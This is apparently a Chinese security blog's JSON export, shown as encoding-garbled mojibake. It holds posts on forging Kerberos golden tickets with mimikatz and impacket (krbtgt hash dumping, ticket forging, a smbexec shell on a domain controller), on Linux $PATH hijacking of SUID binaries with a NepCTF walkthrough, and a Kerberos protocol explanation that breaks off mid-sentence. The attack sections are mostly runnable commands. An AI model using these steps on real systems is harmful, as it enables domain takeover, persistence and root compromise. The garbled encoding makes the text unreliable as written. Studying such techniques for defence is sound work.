åŸŸçš„SIDå€¼(å°±æ˜¯åŸŸæˆå‘˜SIDå€¼å»æ‰æœ€åçš„) krbtgt è´¦å·çš„ NTLM hashå€¼ æˆ– AES-256å€¼ æ­£å¸¸æˆ‘ä»¬ç”¨å·¥å…·ç”Ÿæˆçš„å‡­æ®æ˜¯ .ccache å’Œ .kirbi åç¼€çš„ï¼Œç”¨mimikatzï¼Œkekeoï¼Œrubeusç”Ÿæˆçš„å‡­æ®æ˜¯ä»¥ .kirbi åç¼€çš„ï¼Œimpacket ç”Ÿæˆçš„å‡­æ®çš„åç¼€æ˜¯ .ccache ã€‚ä¸¤ç§ç¥¨æ®ä¸»è¦åŒ…å«çš„éƒ½æ˜¯AS session-key å’Œ åŠ å¯†çš„ Ticketï¼Œå› æ­¤å¯ä»¥ç›¸äº’è½¬åŒ– mimikatz ç”Ÿæˆé»„é‡‘ç¥¨æ®é¦–å…ˆï¼Œåœ¨DCä¸Šç”¨mimikatzè·å– krbtgt hashï¼š 1mimikatz.exe &quot;Log&quot; &quot;lsadump::dcsync /domain:hack.com /user:krbtgt&quot; &quot;exit&quot; å¾—åˆ°ä¿¡æ¯ï¼š SIDï¼šS-1-5-21-3007078554-120081946-2522169796 (ä¸ç®—åé¢-502é‚£éƒ¨åˆ†) NTLM hashï¼š3f9de95a61107e30012e7bb2d9bdcd86 aes256ï¼šde44975a42471227518592e7946202ae2a7eb5f98a08d7323e5d0087c7254669 åŸŸåï¼šhack.com å¾—åˆ° krbtgt çš„hashåï¼Œå»Win2008åŸŸæˆå‘˜æœºå™¨ä¸Š å†åˆ©ç”¨mimikatzç”Ÿæˆé»„é‡‘ç¥¨æ® aes256 keyç”Ÿæˆ 1mimikatz &quot;kerberos::golden /user:Administrator /domain:hack.com /sid:S-1-5-21-3007078554-120081946-2522169796 /krbtgt:3f9de95a61107e30012e7bb2d9bdcd86 /ticket:golden.kirbi&quot; aes256 keyç”Ÿæˆ 1mimikatz &quot;kerberos::golden /user:administrator /domain:hack.com /sid:S-1-5-21-3007078554-120081946-2522169796 /aes256:de44975a42471227518592e7946202ae2a7eb5f98a08d7323e5d0087c7254669 /ticket:golden.kirbi&quot; å¯¼å…¥Golden Ticketï¼š 1mimikatz # kerberos::ptt golden.kirbi æŸ¥çœ‹æœ¬åœ°ç¼“å­˜ï¼Œå‘ç°å‡­æ®æˆåŠŸå¯¼å…¥ 1mimikatz # Kerberos::list å¯¼å…¥é‡‘ç¥¨ä¹‹åï¼Œå†æ¬¡è®¿é—®åŸŸæ§ æˆåŠŸè®¿é—® impacketç”Ÿæˆé»„é‡‘ç¥¨æ®é¦–å…ˆå» githubä¸Šä¸‹è½½æºç ï¼Œä¸‹è½½åœ°å€ï¼šhttps://github.com/fortra/impacket ç„¶åè§£å‹ç¼©ï¼Œè¿›å…¥impacket 12345cd impacket# å®‰è£…ç¯å¢ƒæ‰€éœ€ä¾èµ–ï¼Œä¸€é”®é…ç½®python setup.py install# å·¥å…·éƒ½åœ¨è¿™ä¸ªç›®å½•é‡Œ impacket/examplescd impacket/examples impacket åŒ…é‡Œçš„ ticketer.py ç”Ÿæˆç¥¨æ® ç”¨æ³•ï¼š 123456Examples: ./ticketer.py -nthash &lt;krbtgt/service nthash&gt; -domain-sid &lt;your domain SID&gt; -domain &lt;your domain FQDN&gt; baduser will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4. If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256 (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as baduser.ccache. å·²çŸ¥ä¿¡æ¯ï¼š SIDï¼šS-1-5-21-3007078554-120081946-2522169796 NTLM hashï¼š3f9de95a61107e30012e7bb2d9bdcd86 aes256ï¼šde44975a42471227518592e7946202ae2a7eb5f98a08d7323e5d0087c7254669 1python3 ticketer.py -domain-sid S-1-5-21-3007078554-120081946-2522169796 -nthash 3f9de95a61107e30012e7bb2d9bdcd86 -domain hack.com administrator å¾—åˆ° administrator.ccache å¯¼å…¥ç¥¨æ®ï¼Œexporté…ç½®linuxä¸»æœºç¯å¢ƒå˜é‡ï¼Œå†åˆ©ç”¨impacketçš„smbexecè·å–shellï¼š 123export KRB5CCNAME=administrator.ccachepython3 smbexec.py -no-pass -k DC.hack.com å‡ºç°æ‹’ç»è¿æ¥ã€kali ä¸åœ¨åŸŸå†…ï¼Œæˆ‘ä»¬éœ€è¦æŠŠdnsæ”¹å‘åŸŸæ§ ä¹Ÿå¯ä»¥ç”¨mimikatzå¯¼å…¥ 1kerberos::ptc administrator.ccache è¿™ä¸ªé‡‘ç¥¨ä¸»è¦å¸¸ç”¨äº æ‹¿åˆ°ç¥¨æ®ï¼Œé˜²æ­¢åŸŸç®¡æ”¹å¯†ç äº†ï¼Œè‡ªå·±å»ç”Ÿæˆä¸€ä¸ªåŸŸç®¡è´¦æˆ· æƒé™ç»´æŒæ—¶ç”¨çš„","link":"/2023/10/06/Kerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/"},{"title":"Linux-ç¯å¢ƒå˜é‡ææƒ","text":"&lt;1&gt; ç¯å¢ƒå˜é‡ä»‹ç»$PATHæ˜¯Linuxå’Œç±»Unixæ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå®ƒæŒ‡å®šäº†å­˜å‚¨æ‰€æœ‰å¯æ‰§è¡Œç¨‹åºçš„ bin å’Œ sbin ç›®å½•ã€‚å½“ç”¨æˆ·åœ¨ç»ˆç«¯è¿è¡Œä»»ä½•å‘½ä»¤æ—¶ï¼Œå®ƒå‘shellå‘å‡ºè¯·æ±‚ï¼Œåœ¨ç¯å¢ƒå˜é‡çš„å¸®åŠ©ä¸‹æœç´¢å¯æ‰§è¡Œæ–‡ä»¶ä»¥å“åº”ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ã€‚è¶…çº§ç”¨æˆ·root é€šå¸¸è¿˜å…·æœ‰/sbinå’Œ/usr /sbinæ¡ç›®ï¼Œä»¥ä¾¿è½»æ¾æ‰§è¡Œç³»ç»Ÿç®¡ç†å‘½ä»¤ã€‚ ä½¿ç”¨echoå‘½ä»¤å°±èƒ½æŸ¥çœ‹å’Œå½“å‰ç”¨æˆ·ç›¸å…³çš„ç¯å¢ƒå˜é‡ 12echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin &lt;2&gt; ç¯å¢ƒå˜é‡ææƒåŸç†å…¶åŸç†å°±æ˜¯åˆ©ç”¨suidçš„æƒé™è°ƒç”¨æ‰€å±ä¸»ç”¨æˆ·å³rootç”¨æˆ·æ‰§è¡Œcé‡Œçš„ä»£ç  $PATHä¸»è¦ç”¨äºå®šä¹‰å¯æ‰§è¡Œç¨‹åºçš„æœç´¢ç›®å½•ã€‚å¯æ‰§è¡Œç¨‹åºåŒ…æ‹¬ Linuxç³»ç»Ÿå‘½ä»¤å’Œç”¨æˆ·çš„åº”ç”¨ç¨‹åº ä¾‹å¦‚ï¼šå½“æŸä¸ªç¨‹åº è°ƒç”¨ system(â€œcat /flagâ€) æ—¶ å®ƒå¹¶ä¸æ˜¯ä»¥ system(â€œ/bin/cat /flagâ€);è¿™æ ·æ¥è°ƒç”¨catçš„ å¯ä»¥è¢«åˆ©ç”¨ ç³»ç»Ÿä¼šæŒ‰ç…§$PATHç¯å¢ƒå˜é‡ä¸­å®šä¹‰çš„é¡ºåºï¼Œä»å·¦åˆ°å³æœç´¢cat å¦‚æœ$PATH = /tmp:/usr/local/bin:/usr/local/sbin åˆ™ä¼šä¼˜å…ˆæœç´¢ /tmpç›®å½•æ˜¯å¦å­˜åœ¨cat $PATHç¯å¢ƒå˜é‡åŠ«æŒçš„åŸç†ï¼šå³è‡ªå·±æ„é€ ä¸€ä¸ªåŒåçš„æ¶æ„ç¨‹åºï¼Œå°†è¦æ¶æ„ç¨‹åºæ‰€åœ¨çš„è·¯å¾„æ·»åŠ åˆ°PATHç¯å¢ƒå˜é‡çš„å‰é¢ï¼Œä½¿å…¶è¢«ä¼˜å…ˆåŠ è½½ã€‚ è€Œå¦‚æœæˆ‘ä»¬åŠ«æŒçš„è¿™ä¸ªç¨‹åºï¼Œæ˜¯ä¸€ä¸ªæœ¬èº«å°±å…·æœ‰SUIDæƒé™ï¼Œä»¥rootèº«ä»½æ‰§è¡Œçš„ç¨‹åºï¼Œé‚£ä¹ˆ åŠ«æŒæˆåŠŸçš„è¯ï¼Œå°±æ˜¯rootæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼Œå†™å…¥ /bin/bashå³å¯ææƒ &lt;3&gt; ubuntuç¯å¢ƒé…ç½®ç°åœ¨æˆ‘ä»¬çš„å½“å‰ç›®å½•æ˜¯/home/lvxyzï¼Œæˆ‘ä»¬å°†åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªsrciptç›®å½•ã€‚ç„¶åcdåˆ°scriptç›®å½•ä¸­ï¼Œç¼–å†™ä¸€ä¸ªç®€å•çš„cç¨‹åºæ¥è°ƒç”¨ç³»ç»ŸäºŒè¿›åˆ¶æ–‡ä»¶çš„å‡½æ•° ä»£ç  é€šè¿‡ setuid() å’Œ setgid() æ›´æ”¹uidã€gidä¸º0 å³ root ç„¶åè°ƒç”¨system()å‡½æ•° æ‰§è¡Œ pså‘½ä»¤ å³ç³»ç»ŸäºŒè¿›åˆ¶æ–‡ä»¶/bin/ps 12root@lvxyz-ubuntu:~/script$ whereis psps: /bin/ps /usr/share/man/man1/ps.1.gz æˆ‘ä»¬ä½¿ç”¨gccå‘½ä»¤ç¼–è¯‘demo.cæ–‡ä»¶å¹¶ä¸”èµ‹äºˆç¼–è¯‘æ–‡ä»¶SUIDæƒé™ 123gcc demo.c -o demochmod u+s demols -la demo &lt;4&gt; Attackåˆ©ç”¨å‡è®¾æˆ‘ä»¬çš„ubuntu æ˜¯æˆ‘ä»¬å·²ç»å…¥ä¾µæˆåŠŸçš„ä¸»æœºï¼ŒsshæˆåŠŸç™»å½•lvxyzæ™®é€šç”¨æˆ·äº†ï¼Œç°åœ¨è¦è¿›è¡Œææƒ æˆ‘ä»¬åˆ©ç”¨findå‘½ä»¤æŸ¥æ‰¾ä¸€ä¸‹å…·æœ‰suidæƒé™çš„æ–‡ä»¶ 1find / -perm -u=s -type f 2&gt;/dev/null å‘ç°äº† /home/lvxyz/script/demo æˆ‘ä»¬è¿è¡Œä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å®ƒä¼šæ‰§è¡Œ pså‘½ä»¤ (1) echoå‘½ä»¤å› æ­¤ æˆ‘ä»¬å°±å¾€/tmpå†™å…¥ ä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œå†…å®¹ä¸º /bin/bash 1234567cd /tmpecho &quot;/bin/bash&quot; &gt; pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo å‘ç°æˆåŠŸææƒä¸ºroot (2) cpå‘½ä»¤ä¹Ÿå¯ä»¥é€šè¿‡ cp /bin/bash /tmp/psï¼Œä½¿å¾—/tmp/psæ–‡ä»¶ç­‰ä»·äº/bin/bash ä¸ä¸Šé¢åŒç† æˆåŠŸææƒroot (3) symlinkå‘½ä»¤åˆ©ç”¨æ¡ä»¶ï¼šsuidæƒé™çš„æ–‡ä»¶ç›®å½•æ‹¥æœ‰æ‰€æœ‰æƒé™ åˆ©ç”¨ symlink ç¬¦å·é“¾æ¥å‘½ä»¤ æ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œæœ€å¼€å¤´åŠ ä¸Š . ä»è€Œæ§åˆ¶ç¯å¢ƒå˜é‡ æ‰§è¡Œpsæ—¶ä¼˜å…ˆæ‰¾åˆ° ./ps å³ /bin/bash ææƒ å…¶ä»–å‘½ä»¤åŒç†ï¼Œæ¯”å¦‚ cæ–‡ä»¶é‡Œå†™çš„ system(â€œcat /etc/passwdâ€) æˆ‘ä»¬åªéœ€é‡å†™ä¸€ä¸ª å†…å®¹ä¸º/bin/shçš„ catï¼Œç„¶åæ§åˆ¶ç¯å¢ƒå˜é‡ä½¿å¾— æŸä¸ªsuidæƒé™çš„æ–‡ä»¶é‡Œåœ¨æ‰§è¡Œ catå‘½ä»¤æ—¶ï¼Œä¼˜å…ˆæ‰¾åˆ°æˆ‘ä»¬é‡å†™çš„catå³å¯ææƒ å…³é”®åœ¨äºï¼š æ‰¾åˆ°å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶ï¼ŒçŸ¥é“æ–‡ä»¶é‡Œè°ƒç”¨äº†ä»€ä¹ˆç³»ç»ŸäºŒè¿›åˆ¶æ–‡ä»¶ ç¯å¢ƒå˜é‡ä¸­æœ‰è‡ªå·±èƒ½æ§åˆ¶çš„è·¯å¾„ &lt;5&gt; CTFåº”ç”¨ - nepctf ç‹¬æ­¥å¤©ä¸‹nc ip portè¿›å…¥ç¯å¢ƒ ls / å‘ç°äº†flag ç›´æ¥è¯»å–ä¸è¡Œ æ²¡æœ‰æƒé™ é¢˜ç›®æç¤ºï¼šç¯å¢ƒå˜é‡ææƒ æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶ï¼šfind / -perm -u=s -type f æ‰¾åˆ°äº† /bin/nmap ä¸”å…¶æ‹¥æœ‰è€…ä¸ºroot 1-rwsr-xr-x 1 root root 931712 Jul 17 09:46 nmap æ‰§è¡Œä¸€ä¸‹ å‘ç° nmapé‡Œè°ƒç”¨äº† ports-alive 123/bin $ nmap 1nmap 1sh: ports-alive: not found ç¯å¢ƒå˜é‡ææƒï¼Œåœ¨/tmpä¸‹åˆ›å»ºä¸€ä¸ªåä¸º ports-alive å†…å®¹ä¸º /bin/sh è„šæœ¬ã€‚export /tmpåˆ°$PATHé‡Œæœ€å·¦è¾¹ã€‚è¿è¡Œ/bin/nmap æ—¶åŠ«æŒ ports-aliveå‘½ä»¤ï¼Œä»è€Œä»¥rootèº«ä»½æ‰§è¡Œ/bin/sh ææƒ 12345cd /tmpecho &quot;/bin/sh&quot; &gt; ports-alivechmod +x ports-aliveexport PATH=/tmp:$PATH/bin/nmap 1 å‚è€ƒï¼šhttps://xz.aliyun.com/t/2767","link":"/2023/08/19/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/"},{"title":"Kerberosè®¤è¯å­¦ä¹ ","text":"åœ¨åŸŸä¸­ï¼Œç½‘ç»œå¯¹è±¡å¯ä»¥ç›¸äº’è®¿é—®ï¼Œä½†æ˜¯åœ¨çœŸå®æƒ…å†µä¸­ï¼Œéœ€è¦å¯¹æŸäº›éƒ¨é—¨çš„è®¡ç®—æœºè¿›è¡Œé™åˆ¶ï¼Œä¾‹å¦‚ï¼šé”€å”®éƒ¨é—¨ä¸èƒ½è®¿é—®æŠ€æœ¯éƒ¨é—¨çš„æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸­é—´å°±éœ€è¦ Kerberosè®¤è¯åè®®æ¥éªŒè¯ç½‘ç»œå¯¹è±¡é—´çš„æƒé™ ç½‘ç»œå¯¹è±¡åˆ†ä¸º:ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€åŸŸã€ç»„ç»‡å•ä½ä»¥åŠå®‰å…¨ç­–ç•¥ç­‰ç­‰ &lt;1&gt; Kerberosåè®®ç®€ä»‹Kerberos æ˜¯ä¸€ç§ç½‘ç»œèº«ä»½è®¤è¯åè®®ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯é€šè¿‡å¯†é’¥ç³»ç»Ÿä¸ºå®¢æˆ·æœº / æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºå¤§çš„è®¤è¯æœåŠ¡ã€‚è¯¥è®¤è¯è¿‡ç¨‹çš„å®ç°ä¸ä¾èµ–äºä¸»æœºæ“ä½œç³»ç»Ÿçš„è®¤è¯ï¼Œæ— éœ€åŸºäºä¸»æœºåœ°å€çš„ä¿¡ä»»ï¼Œä¸è¦æ±‚ç½‘ç»œä¸Šæ‰€æœ‰ä¸»æœºçš„ç‰©ç†å®‰å…¨ï¼Œå¹¶å‡å®šç½‘ç»œä¸Šä¼ é€çš„æ•°æ®åŒ…å¯ä»¥è¢«ä»»æ„åœ°è¯»å–ã€ä¿®æ”¹å’Œæ’å…¥æ•°æ®ã€‚åœ¨ä»¥ä¸Šæƒ…å†µä¸‹ï¼Œ Kerberos ä½œä¸ºä¸€ç§å¯ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹è®¤è¯æœåŠ¡ï¼Œæ˜¯é€šè¿‡ä¼ ç»Ÿçš„å¯†ç æŠ€æœ¯ï¼ˆå¦‚ï¼šå…±äº«å¯†é’¥ï¼‰æ‰§è¡Œè®¤è¯æœåŠ¡çš„ Kerberos ä¸»è¦æ˜¯ç”¨åœ¨åŸŸç¯å¢ƒä¸‹çš„èº«ä»½è®¤è¯åè®® &lt;2&gt; Kerberosåè®®è§’è‰²ç»„æˆkerberosæ˜¯æ˜¯å¤å¸Œè…Šç¥è¯ä¸­å…·æœ‰ä¸‰ä¸ªå¤´é¢…çš„åœ°ç‹±çœ‹é—¨çŠ¬ï¼Œå®ˆæŠ¤åœ¨åœ°ç‹±ä¹‹å¤–ï¼Œèƒ½å¤Ÿè¯†åˆ«æ‰€æœ‰è·¯è¿‡çš„äº¡çµï¼Œé˜²æ­¢æ´»ç€çš„å…¥ä¾µè€…é—¯å…¥åœ°ç‹± ç¥è¯é‡Œ kerberos å…·æœ‰ä¸‰ä¸ªç‹—å¤´ï¼Œåœ¨ kerberos åè®®é‡Œä¹Ÿå­˜åœ¨ä¸‰ä¸ªè§’è‰²ã€‚åˆ†åˆ«æ˜¯ Clientã€Serverã€KDC åŸºæœ¬æ¦‚å¿µï¼š Clientï¼šå®¢æˆ·ç«¯ Serverï¼šæœåŠ¡ç«¯ï¼Œå¯èƒ½æ˜¯æŸä¸ªè®¡ç®—æœºï¼Œä¹Ÿå¯èƒ½æ˜¯æŸä¸ªæœåŠ¡ Key Distribution Center (å¯†é’¥åˆ†å‘ä¸­å¿ƒ) ï¼šç®€ç§° KDCï¼Œé»˜è®¤å®‰è£…åœ¨åŸŸæ§ ä¸€èˆ¬åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š Authentication Service(èº«ä»½éªŒè¯æœåŠ¡)ï¼Œç®€ç§°ASï¼Œè®¤è¯æœåŠ¡å™¨ï¼Œç”¨äº KDC å¯¹ Client è®¤è¯ å¹¶å‘æ”¾ç”¨æˆ·ç”¨äºè®¿é—® TGS çš„TGTã€‚ Ticket Grantng Service (ç¥¨æ®æˆäºˆæœåŠ¡)ï¼Œç®€ç§°TGSï¼Œç”¨äºKDCå‘Clientå’ŒServeråˆ†å‘Session Keyã€‚ Session Keyï¼šä¸´æ—¶ç§˜é’¥ï¼Œç”¨æ¥åŠ å¯†ç½‘ç»œä¸Šä¼ è¾“çš„æ•°æ®ï¼Œåªåœ¨ä¸€æ®µæ—¶é—´å†…æœ‰æ•ˆ Ticket Granting Ticket (ç¥¨æ®è®¸å¯)ï¼šç®€ç§° TGT ADï¼ˆAccount Databaseï¼‰: å­˜å‚¨æ‰€æœ‰clientçš„ç™½åå•ï¼Œåªæœ‰å­˜åœ¨äºç™½åå•çš„clientæ‰èƒ½é¡ºåˆ©ç”³è¯·åˆ°ticket KDCæœåŠ¡æ¡†æ¶ä¸­åŒ…å«ä¸€ä¸ªKRBTGTè´¦æˆ·ï¼Œå®ƒæ˜¯åœ¨åˆ›å»ºåŸŸæ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªè´¦å·ï¼Œå¯ä»¥æš‚æ—¶ç†è§£ä¸ºä»–å°±æ˜¯ä¸€ä¸ªæ— æ³•ç™»é™†çš„è´¦å· &lt;3&gt; Kerberosåè®®è®¤è¯æµç¨‹(1) è®¤è¯æµç¨‹æˆ‘ä»¬å¯ä»¥æŠŠè®¤è¯è¿‡ç¨‹åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š 1ï¼Œ2éƒ¨åˆ†ä¸ºAuthentication 1ï¼Œå®¢æˆ·ç«¯å‘ASè¯æ˜è‡ªå·±èº«ä»½çš„è¿‡ç¨‹ã€‚é¦–å…ˆClientå‘DCè¯·æ±‚è®¿é—®Serverï¼ŒDCä¼šåˆ¤æ–­Client æ˜¯å¦å¯ä¿¡ã€‚æ€ä¹ˆåˆ¤æ–­ï¼Ÿå»ADä¸­å­˜å‚¨çš„é»‘åå•å’Œç™½åå•æŸ¥æ‰¾ä¾æ¬¡åŒºåˆ†Clientã€‚è®¤è¯æˆåŠŸASä¼šè¿”å›ä¸€ä¸ªç¥¨æ®è®¸å¯TGTï¼ˆTicket Granting Ticketï¼‰ 3ï¼Œ4éƒ¨åˆ†ä¸ºAuthentication 2ï¼ŒClientç»§ç»­æ‹¿ç€ TGT è¯·æ±‚DCè®¿é—®Serverï¼ŒTGSä¼šé€šè¿‡ Client æ¶ˆæ¯ä¸­çš„TGTï¼Œåˆ¤æ–­Clientæ˜¯å¦æœ‰æœåŠ¡å™¨çš„è®¿é—®æƒé™ã€‚å¦‚æœæœ‰ TGS åˆ™è¿”å›ç¥¨æ®STï¼ˆService Ticketï¼‰ 5ï¼Œ6éƒ¨åˆ†ä¸ºAuthentication 3ï¼ŒClientå¾—åˆ°ç¥¨æ®ST(è¯¥ ST åªé’ˆå¯¹è¿™ä¸ªServer)ï¼Œå†å»è®¿é—®Serverï¼ŒServerå’ŒClient æˆåŠŸå»ºç«‹é€šä¿¡ ä¸¾ä¸ªç”Ÿæ´»ä¸­ä¾‹å­æ¥ç†è§£ï¼š æ¯”å¦‚ç°åœ¨ç–«æƒ…æœŸé—´å»å…¬å›­ç©ï¼Œéœ€è¦æå‰ä¸€å¤©é¢„çº¦ï¼Œä½ åœ¨ç½‘ä¸Šé¢„çº¦åï¼Œä¼šç»™ä½ ä¸€ä¸ªé¢„çº¦ä¿¡æ¯ï¼Œç¬¬äºŒå¤©æ‹¿ç€é¢„çº¦ä¿¡æ¯å»å”®ç¥¨å¤„ä¹°ç¥¨ï¼Œå”®ç¥¨å¤„ä¼šç»™ä½ ä¸€å¼ å…¬å›­é—¨ç¥¨ï¼Œä½ æ‹¿ç€é—¨ç¥¨å»å…¬å›­å…¥å£åˆ·é—¨ç¥¨æ‰èƒ½è¿›å…¥å…¬å›­ã€‚ åœ¨å»å…¬å›­ç©çš„æµç¨‹ä¸­ 1ã€ç½‘ä¸Šé¢„çº¦è¿”å›ç»™ä½ ä¸€ä¸ªé¢„çº¦ä¿¡æ¯è¿™ä¸ªè¿‡ç¨‹å°±ç›¸å½“äºclientï¼ˆä½ ï¼‰å»è®¿é—®ASï¼ˆç½‘ä¸Šé¢„çº¦ä¸­å¿ƒï¼‰ï¼ŒASè¿”å›ç»™clientä¸€ä¸ªTGTï¼ˆé¢„çº¦ä¿¡æ¯ï¼‰ 2ã€ä½ æ‹¿ç€é¢„çº¦ä¿¡æ¯å»å”®ç¥¨å¤„ä¹°ç¥¨ï¼Œå”®ç¥¨å¤„ç»™ä½ ä¸€å¼ ç¥¨è¿™ä¸ªè¿‡ç¨‹å°±ç›¸å½“äºclientï¼ˆä½ ï¼‰ä½¿ç”¨TGTï¼ˆé¢„çº¦ä¿¡æ¯ï¼‰å»è®¿é—®TGSï¼ˆå”®ç¥¨å¤„ï¼‰ï¼ŒTGSè¿”å›clientä¸€ä¸ªTicketï¼ˆå…¬å›­é—¨ç¥¨ï¼‰ 3ã€ä½ æ‹¿ç€é—¨ç¥¨å»åˆ·ç¥¨å…¥å›­å°±ç›¸å½“äºclientï¼ˆä½ ï¼‰ç”¨ticketï¼ˆå…¬å›­é—¨ç¥¨ï¼‰å»serverï¼ˆå…¬å›­å…¥å£ï¼‰ï¼Œserveræ”¶åˆ°ticketå’ŒKDCï¼ˆæ£€ç¥¨æœºï¼‰è¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡æ‰èƒ½è®¿é—® 4ã€é—¨ç¥¨çš„æ—¶é—´æ˜¯ä¸€å¤©ï¼Œç›¸å½“äºKerberosçš„å…è®¸è®¿é—®æ—¶é—´ï¼Œä½ è¿›å…¬å›­å†å‡ºæ¥ï¼Œå½“å¤©åœ¨è¿›å…¬å›­å°±ä¸éœ€è¦å†å»é¢„çº¦ï¼Œä¹°ç¥¨äº†ï¼Œåªéœ€è¦å»åˆ·ç¥¨è¿›å»å°±è¡Œ (2) å®¢æˆ·ç«¯ä¸ASé€šä¿¡åˆ†æ(Authentication 1)Authentication 1 å³ å®¢æˆ·ç«¯å‘ASè¯æ˜è‡ªå·±èº«ä»½çš„è¿‡ç¨‹ã€‚ç›®çš„æ˜¯ä¸ºè·å–ç¥¨æ®è®¸å¯ TGT(Ticket Granting Ticket) krbtgtæ˜¯ KDCçš„è´¦å· åä¸ºå¯†é’¥åˆ†å‘ä¸­å¿ƒè´¦æˆ· é¦–å…ˆClientè¦å‘é€è‡ªå·±çš„ä¿¡æ¯å‘ASè¯·æ±‚TGTç¥¨æ® ã€‚**æä¾›èº«ä»½ä¿¡æ¯çš„æ•°æ®åŒ…æ˜¯ AS-REQ(AS-requests)**ï¼Œèº«ä»½ä¿¡æ¯åŒ…æ‹¬ï¼šç”¨æˆ·å/IDã€IPã€Time ASæ”¶åˆ° Clientå‘é€çš„èº«ä»½ä¿¡æ¯æ•°æ®åŒ…åï¼ŒASä¼šå…ˆå‘ADè¯·æ±‚ï¼Œè¯¢é—®è¯¥Clientæ˜¯å¦å¯ä¿¡ï¼Œå¦‚æœåœ¨ç™½åå•é‡Œçš„è¯ï¼Œå°±ä¼šå–å‡ºå®ƒçš„NTLM hashï¼Œç„¶åç”Ÿæˆä¸€ä¸ªéšæœºç§˜é’¥ç§°ä¸ºAS_Session-Keyï¼ˆä¸´æ—¶å¯†é’¥ï¼‰ AS ä¼šå‘é€TGTç»™ Clientã€‚ TGTåŒ…å«ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š ä¸€éƒ¨åˆ†æ˜¯ ä½¿ç”¨Clientç”¨æˆ·hashè¿›è¡ŒåŠ å¯†çš„ Timeã€TGSnameã€TGTæœ‰æ•ˆæ—¶é—´å’Œéšæœºå¯†é’¥AS_Session Key å¦ä¸€éƒ¨åˆ†åˆ™æ˜¯ KDCç”¨æˆ·krbtgt è‡ªå·±hashåŠ å¯†çš„Timeã€Client Nameã€Client IPã€TGSnameã€TGTæœ‰æ•ˆæ—¶é—´ã€AS_Session Keyã€‚å‘é€TGTçš„æ•°æ®åŒ…æ˜¯AS-REP(AS-response) clientç”¨æˆ·hash clientè‡ªå·±çŸ¥é“ã€‚å› æ­¤ Clientä¼šè·å¾—ä¸€ä¸ªæ— æ³•è§£å¯†çš„TGTå’Œ ä¸€ä¸ª AS_Session Keyã€‚ (3) å®¢æˆ·ç«¯å’ŒTGSé€šä¿¡åˆ†æ(Authentication 2)Authentication 2ï¼Œå³ Client å’Œ TGSçš„è®¤è¯ Clientæ”¶åˆ°KRB_AS_REPåï¼Œå…ˆç”¨è‡ªå·±çš„Client NTLM-hash è§£å¯†å¾—åˆ°AS_Session Keyï¼Œå¹¶ä½¿ç”¨ AS_Session Key åŠ å¯†æ•°æ®(Timeã€Nameã€IP)ä½œä¸ºä¸€éƒ¨åˆ†ï¼Œä¸ krbtgt è´¦æˆ·çš„NTLM hashåŠ å¯†çš„å¦ä¸€éƒ¨åˆ†ï¼Œé‡æ–°å°è£…æˆTGT ç»„æˆ TGS_REQ å‘é€ç»™TGS TGSæ”¶åˆ°è¯¥è¯·æ±‚ï¼Œç”¨krbtgt NTLM-hash å…ˆè§£å¯†TGT å¾—åˆ° AS_Session Keyã€æ—¶é—´æˆ³ã€TGTæœ‰æ•ˆå‘¨æœŸã€Client Nameã€Client IPç­‰ç­‰ï¼Œç„¶åå†ç”¨è§£å¯†å¾—åˆ°çš„ AS_Session Key è§£å¯†ç¬¬ä¸€éƒ¨åˆ†å†…å®¹ï¼Œå¾—åˆ° Client Nameã€Client IPå’Œæ—¶é—´æˆ³ ã€‚ TGSä¼šå°†ä¸¤éƒ¨åˆ†è·å–åˆ°æ—¶é—´æˆ³timestampè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ—¶é—´æˆ³è·Ÿå½“å‰æ—¶é—´ç›¸å·®å¤ªä¹…ï¼Œå°±éœ€è¦é‡æ–°è®¤è¯ TGSè¿˜ä¼šå°†è¿™ä¸ªClientçš„ä¿¡æ¯ä¸TGTä¸­çš„Clientä¿¡æ¯è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸¤ä¸ªç›¸ç­‰çš„è¯ï¼Œè¿˜ä¼šç»§ç»­åˆ¤æ–­Clientæœ‰æ²¡æœ‰æƒé™è®¿é—®Serverï¼Œå¦‚æœéƒ½æ²¡æœ‰é—®é¢˜ï¼Œåˆ™è®¤è¯æˆåŠŸï¼ŒTGSä¼šç”Ÿæˆä¸€ä¸ªTGS_Session Key(éšæœºå¯†é’¥) ç„¶åTGSä¼šå‘é€ST(ä¹Ÿå«Ticket)ç»™Clientã€‚ STä¹ŸåŒ…å«ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š ä¸€éƒ¨åˆ†æ˜¯ ä½¿ç”¨ AS_Session Key è¿›è¡ŒåŠ å¯†çš„ æ—¶é—´æˆ³ã€STæœ‰æ•ˆæ—¶é—´ å’Œ éšæœºå¯†é’¥TGS_Session Key å¦ä¸€éƒ¨åˆ†åˆ™æ˜¯ ä½¿ç”¨Server 